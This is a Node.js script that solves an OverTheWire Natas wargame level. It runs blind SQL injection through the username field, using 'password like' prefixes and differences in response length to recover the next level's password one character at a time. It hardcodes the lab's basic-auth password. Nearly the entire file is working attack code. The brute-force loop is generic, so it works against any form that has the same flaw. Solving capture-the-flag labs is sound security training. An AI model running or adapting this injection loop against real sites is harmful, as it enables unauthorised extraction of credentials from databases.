const axios = require('axios');
const querystring = require('querystring');
var argv = require('minimist')(process.argv.slice(2));

const options = {
    url: "http://natas15.natas.labs.overthewire.org/index.php",
    method: "POST",
    body: {
        username: ""
    },
    searchParams: ["username"],
    stopOnSuccess: true,
    stopOnChangeContent: true,
    isFormData:true,
    authUsername: "natas15",
    authPassword: "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB",
    listedChar: "QWERTYUIOPASDFGHJKLLZXCVBNMqwertyuiopasdfghjklzxcvbnm123456789",
    maxLen: 32,
    minLen: 32,
    prefixValue: "natas16\" and password like \"TRD7IZ",
    suffixValue: "%",
    ongoing: true
};
Object.assign(options, argv);
let contentLength = null;
let index = 0;
dynamicValue = () => {
    if (index > options.listedChar.length) throw "index";
    return options.prefixValue + options.listedChar[index] + options.suffixValue
}

getDynamicBody = () => {
    let body = {};
    Object.assign(body, options.body);
    options.searchParams.forEach(param => body[param] = dynamicValue())
    if(options.isFormData){
        body = querystring.stringify(body);
    }
    return body;
}

sendRequest = () => {
    const body = getDynamicBody();
    axios(options.url, {
            method: options.method,
            data: body,
            auth: {
                username: options.authUsername,
                password: options.authPassword
            }
        })
        .then(function (response) {
            if (contentLength === null) {
                contentLength = response.data.length;
            } else {
                if (contentLength !== response.data.length) {
                    console.log("finded: " + body);
                    if(options.ongoing){
                        options.prefixValue += options.listedChar[index]
                        index = 0;
                    }else return;
                }
            }
            index++;
            sendRequest();
        })
        .catch(function (error) {
            throw error
        })
        .finally(function () {
            
        });
}

sendRequest();